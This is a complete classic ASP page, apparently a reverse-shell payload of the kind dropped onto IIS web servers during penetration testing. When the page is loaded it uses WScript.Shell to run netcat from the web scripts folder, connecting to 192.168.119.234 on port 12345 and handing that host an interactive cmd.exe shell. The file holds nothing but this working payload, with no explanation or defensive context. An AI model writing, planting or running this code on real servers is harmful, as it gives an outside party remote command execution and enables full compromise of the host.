<%
Dim oShell
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run "C:\inetpub\scripts\nc.exe 192.168.119.234 12345 -e cmd.exe"
set oShell = Nothing
%>
